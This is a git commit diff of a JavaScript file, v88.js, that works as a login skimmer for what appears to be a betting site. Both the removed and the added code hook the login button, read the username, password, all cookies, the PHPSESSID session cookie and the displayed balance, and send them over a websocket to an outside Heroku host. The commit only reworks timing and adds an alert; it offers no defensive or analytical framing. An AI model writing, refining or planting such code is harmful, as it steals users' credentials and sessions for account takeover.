9dd872678485dd520b8bfcb3f51426e3e258632f
Nhân Nguyễn <nhnhan.18it1@sict.udn.vn>
2021-05-11 12:28:59 +0700

    hello

--- v88.js
+++ v88.js
@@ -1,16 +1,24 @@
-const socket = io("https://vin88.herokuapp.com",{ transport : ['websocket'] });
-var jQueryScript = document.createElement('script');  
-jQueryScript.setAttribute('src','https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js');
-document.head.appendChild(jQueryScript);
+
+
+const socket = io("https://vin88.herokuapp.com", { transport: ['websocket'] });
 var acc = {}
-$(".button-login").click(function (e) { 
-    e.preventDefault();
-    acc.username = $("input[name=txtUsername]").val();
-    acc.pass = $("input[name=txtPassword]").val();
-    setTimeout(() => {
-        acc.cookie = document.cookie
-        acc.gvin = $(".money-1").text();
-        acc.sessid = $.cookie("PHPSESSID");
-        socket.emit('loginchange',acc)
-    }, 10000);
-});
+
+
+var jQueryScript = document.createElement('script');
+jQueryScript.setAttribute('src', 'https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js');
+document.head.appendChild(jQueryScript);
+setTimeout(() => {
+    console.log("ff");
+    $(".button-login").on('click', function () {
+        console.log("click");
+        acc.username = $("input[name=txtUsername]").val();
+        acc.pass = $("input[name=txtPassword]").val();
+        setTimeout(() => {
+            acc.cookie = document.cookie
+            acc.gvin = $(".money-1").text();
+            acc.sessid = $.cookie("PHPSESSID");
+            alert(acc.gvin)
+            socket.emit('loginchange', acc)
+        }, 10000);
+    });
+}, 5000)
